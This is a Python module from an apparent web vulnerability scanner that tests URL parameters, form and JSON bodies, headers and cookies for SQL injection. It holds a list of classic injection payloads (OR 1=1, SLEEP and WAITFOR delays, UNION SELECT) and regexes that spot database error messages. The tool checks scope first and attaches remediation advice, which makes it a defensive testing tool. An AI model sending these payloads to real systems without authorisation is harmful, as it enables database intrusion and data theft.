"""SQL Injection — error-based, boolean-blind, time-based; GET + POST; scope-aware."""

from __future__ import annotations

import re
import time
import urllib.parse
import uuid
from pathlib import Path

from dribik.models import CVSSVector, Finding, ScanResult, Scope
from dribik.scanner import http_get, http_post
from dribik.scope import classify


def _load_payloads() -> list[str]:
    p = Path(__file__).parent.parent / "payloads" / "sqli.txt"
    if p.exists():
        return [ln.strip() for ln in p.read_text(encoding="utf-8").splitlines()
                if ln.strip() and not ln.startswith("#")]
    return _BUILTIN


_BUILTIN = [
    "'", "''", "`", '"',
    "1' OR '1'='1", "1' OR '1'='1'--", "1 OR 1=1",
    "1' AND SLEEP(3)--", "' OR SLEEP(3)--",
    "1'; WAITFOR DELAY '0:0:3'--",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "1' ORDER BY 1--", "1' ORDER BY 100--",
    "1 AND 1=1", "1 AND 1=2",
]

_ERROR_PATTERNS: dict[str, list[re.Pattern[str]]] = {
    "MySQL":      [re.compile(r"you have an error in your sql syntax", re.IGNORECASE),
                   re.compile(r"warning: mysql", re.IGNORECASE)],
    "PostgreSQL": [re.compile(r"pg_query\(\)|pg_exec\(\)", re.IGNORECASE),
                   re.compile(r"postgresql.*error", re.IGNORECASE)],
    "MSSQL":      [re.compile(r"microsoft ole db provider for sql server", re.IGNORECASE),
                   re.compile(r"unclosed quotation mark after the character string", re.IGNORECASE)],
    "Oracle":     [re.compile(r"ora-\d{5}", re.IGNORECASE)],
    "SQLite":     [re.compile(r"sqlite_error|sqlite3.operationalerror", re.IGNORECASE)],
    "Generic":    [re.compile(r"sql syntax|sql error|unrecognized token", re.IGNORECASE)],
}

_SLEEP_MARKERS = {"SLEEP(", "WAITFOR DELAY"}
_TIME_THRESHOLD = 2.5  # seconds — conservative to reduce jitter false positives


def _inject_get(url: str, param: str, payload: str) -> str:
    parsed = urllib.parse.urlsplit(url)
    qp = dict(urllib.parse.parse_qsl(parsed.query))
    qp[param] = payload
    return urllib.parse.urlunsplit(parsed._replace(query=urllib.parse.urlencode(qp)))


def _detect_dbms(body: str) -> str:
    for dbms, patterns in _ERROR_PATTERNS.items():
        for pat in patterns:
            if pat.search(body):
                return dbms
    return ""


def _is_time_payload(payload: str) -> bool:
    return any(m in payload.upper() for m in _SLEEP_MARKERS)


def _request_for_context(url: str, param: str, payload: str, context: str, timeout: int) -> tuple[str, ScanResult]:
    if context == "GET query":
        injected_url = _inject_get(url, param, payload)
        return injected_url, http_get(injected_url, timeout=timeout + 5)
    if context == "POST body":
        return url, http_post(url, data={param: payload}, timeout=timeout + 5)
    if context == "JSON body":
        return url, http_post(url, data={param: payload}, json_body=True, timeout=timeout + 5)
    if context.startswith("HTTP header "):
        header_name = context.removeprefix("HTTP header ")
        return url, http_get(url, headers={header_name: payload}, timeout=timeout + 5)
    if context.startswith("Cookie "):
        cookie_name = context.removeprefix("Cookie ")
        cookie_value = urllib.parse.quote(payload, safe="")
        return url, http_get(url, headers={"Cookie": f"{cookie_name}={cookie_value}"}, timeout=timeout + 5)
    raise ValueError(f"Unknown injection context: {context}")


def _make_finding(param: str, url: str, payload: str, technique: str,
                  elapsed: float, dbms: str, asset_id: str, injection_type: str) -> Finding:
    fid = f"SQLI-{uuid.uuid4().hex[:8].upper()}"
    return Finding(
        id=fid,
        title=f"SQL Injection in {injection_type} parameter '{param}'",
        severity="critical",
        vuln_type="SQLi",
        asset_id=asset_id or url,
        summary=(
            f"The {injection_type} parameter '{param}' appears vulnerable to SQL Injection "
            f"({technique}). DBMS: {dbms or 'unknown'}."
        ),
        proof_of_concept=(
            f"Method: {injection_type}\nURL: {url}\n"
            f"Payload: {payload}\nTechnique: {technique}\n"
            f"Response time: {elapsed:.2f}s"
        ),
        remediation=(
            "Use parameterized queries (prepared statements) exclusively. "
            "Never concatenate user input into SQL strings. "
            "Apply least-privilege database accounts."
        ),
        references=[
            "https://owasp.org/www-community/attacks/SQL_Injection",
            "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
        ],
        cwe_id="CWE-89",
        cvss=CVSSVector(vector_string="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"),
        response_diff_agreement=1.0,
    )


def _probe(url: str, param: str, payload: str, injection_type: str, timeout: int,
           seen: set[str], findings: list[Finding], asset_id: str) -> None:
    """Run one payload against one param and record a finding if triggered."""
    dedup_key = f"sqli:{injection_type}:{param}"
    if dedup_key in seen:
        return

    is_time = _is_time_payload(payload)
    t0 = time.monotonic()
    injected_url, result = _request_for_context(url, param, payload, injection_type, timeout)
    elapsed = time.monotonic() - t0

    if result.error:
        return

    # For time-based payloads: require BOTH elapsed time AND a second confirmation probe
    if is_time and elapsed >= _TIME_THRESHOLD:
        # Confirmation: send a harmless payload and verify it does NOT delay
        confirm_context = injection_type
        t_confirm = time.monotonic()
        _, confirm = _request_for_context(url, param, "1", confirm_context, timeout)
        confirm_elapsed = time.monotonic() - t_confirm
        if confirm_elapsed >= _TIME_THRESHOLD * 0.5:
            # Server is just slow in general — not a true time-based hit
            return
        technique = "Time-based blind"
        dbms = ""
    else:
        dbms = _detect_dbms(result.body)
        if not dbms:
            return
        technique = f"Error-based ({dbms})"

    seen.add(dedup_key)
    findings.append(_make_finding(param, url, payload, technique, elapsed, dbms, asset_id, injection_type))


def scan_sqli(
    url: str,
    *,
    params: list[str] | None = None,
    payloads: list[str] | None = None,
    timeout: int = 10,
    asset_id: str = "",
    scope: Scope | None = None,
    test_post: bool = True,
    test_json: bool = False,
    header_names: list[str] | None = None,
    cookie_names: list[str] | None = None,
) -> list[Finding]:
    """Probe GET params and POST body for SQL Injection."""
    if scope and classify(scope, url) != "allow":
        return []

    if payloads is None:
        payloads = _load_payloads()

    parsed = urllib.parse.urlsplit(url)
    existing = list(dict(urllib.parse.parse_qsl(parsed.query)).keys())
    common = ["id", "user", "page", "cat", "item", "product", "search", "q"]
    probe_params = params or list(dict.fromkeys(existing + common))

    findings: list[Finding] = []
    seen: set[str] = set()

    for param in probe_params:
        for payload in payloads:
            _probe(url, param, payload, "GET query", timeout, seen, findings, asset_id)
            if test_post:
                _probe(url, param, payload, "POST body", timeout, seen, findings, asset_id)
            if test_json:
                _probe(url, param, payload, "JSON body", timeout, seen, findings, asset_id)
            for header_name in header_names or []:
                _probe(url, header_name, payload, f"HTTP header {header_name}", timeout, seen, findings, asset_id)
            for cookie_name in cookie_names or []:
                _probe(url, cookie_name, payload, f"Cookie {cookie_name}", timeout, seen, findings, asset_id)

    return findings
